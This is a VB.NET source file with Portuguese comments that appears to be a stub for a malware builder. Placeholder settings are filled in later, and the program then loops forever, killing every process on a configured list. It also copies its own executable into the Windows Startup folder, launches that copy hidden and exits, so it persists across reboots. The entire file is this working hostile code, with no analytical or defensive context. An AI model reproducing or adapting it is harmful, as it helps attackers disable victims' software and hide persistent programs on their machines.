Imports System.Windows.Forms
Imports System.IO

Module MdProcess

    Public MinhaListProcess As String = "%MinhaLiistaas%"
    Public MinhaDelayS As String = "%MinhaDelayy%"
    Public AtivarStartUp As String = "%AtivarStartUpp%"
    Public NomeStartUp As String = "%NomeStartUpp%"

    Sub Main()

        'VERIFICAR SE A STRING TA PADRÃO
        If MinhaListProcess = "%MinhaLiistaas%" Then
            End
        End If

VerificarDenovo:

        Try
            'SEPARAR
            Dim N As String() = Split(MinhaListProcess, ",")
            For Each Y In N
                Application.DoEvents()
                'FINALIZAR PROCESSO
                For Each ii In Process.GetProcessesByName(Y) : ii.Kill() : Next
            Next

            Try 'COPIAR PARA STARTUP
                If AtivarStartUp = "True" Then
                    If Not File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe") Then
                        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe", True)
                        ESPERA(1)
                        Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe", AppWinStyle.Hide)
                        End
                    Else
                        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe", True)
                        ESPERA(1)
                        Diagnostics.Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & NomeStartUp & ".exe", AppWinStyle.Hide)
                        End
                    End If
                End If
            Catch ex As Exception

            End Try

            'DELAY
            ESPERA(MinhaDelayS)

            'VOLTAR PARA O COMEÇO
            GoTo VerificarDenovo
        Catch ex As Exception
            GoTo VerificarDenovo
        End Try

    End Sub

    'DELAY
    Public Sub ESPERA(ByVal INTERVALO As Integer)
        Dim PARADA As New Stopwatch
        PARADA.Start()
        Do While PARADA.ElapsedMilliseconds < INTERVALO * 1000
            Application.DoEvents()
        Loop
        PARADA.Stop()
    End Sub

End Module
